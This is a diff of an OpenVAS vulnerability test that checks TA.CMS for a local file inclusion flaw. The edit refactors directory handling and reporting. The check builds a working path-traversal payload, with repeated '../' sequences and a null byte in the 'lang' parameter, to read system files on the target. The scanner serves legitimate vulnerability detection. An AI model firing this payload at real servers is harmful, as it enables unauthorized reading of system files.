@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_ta.cms_50773.nasl 5648 2017-03-21 09:52:17Z cfi $
+# $Id: gb_ta.cms_50773.nasl 5751 2017-03-28 14:37:16Z cfi $
 #
 # TA.CMS Local File Include and SQL Injection Vulnerabilities
 #
@@ -33,22 +33,17 @@ access or modify data, exploit latent vulnerabilities in the
 underlying database, and view and execute arbitrary local files within
 the context of the webserver.";
 
-
-if (description)
+if(description)
 {
  script_id(103346);
  script_bugtraq_id(50773);
- script_version ("$Revision: 5648 $");
-
+ script_version ("$Revision: 5751 $");
  script_name("TA.CMS Local File Include and SQL Injection Vulnerabilities");
-
-
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
- script_tag(name:"last_modification", value:"$Date: 2017-03-21 10:52:17 +0100 (Tue, 21 Mar 2017) $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-28 16:37:16 +0200 (Tue, 28 Mar 2017) $");
  script_tag(name:"creation_date", value:"2011-11-24 10:43:43 +0100 (Thu, 24 Nov 2011)");
  script_tag(name:"qod_type", value:"remote_vul");
- script_summary("Determine if installed TA.CMS is vulnerable");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
@@ -64,27 +59,26 @@ if (description)
 include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
    
 port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
 if(!can_host_php(port:port))exit(0);
 
-dirs = make_list("/cms",cgi_dirs());
 files = traversal_files();
 
-foreach dir (dirs) {
+foreach dir( make_list_unique( "/cms", cgi_dirs( port:port ) ) ) {
+
+  if( dir == "/" ) dir = "";
+
   foreach file (keys(files)) {
    
     url = string(dir, "/?lang=",crap(data:"../",length:9*3),files[file],"%00.png&amp;p_id=60"); 
 
     if(http_vuln_check(port:port, url:url,pattern:file)) {
-     
-      security_message(port:port);
-      exit(0);
-
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
     }
   }
 }
 
-exit(0);
+exit( 99 );
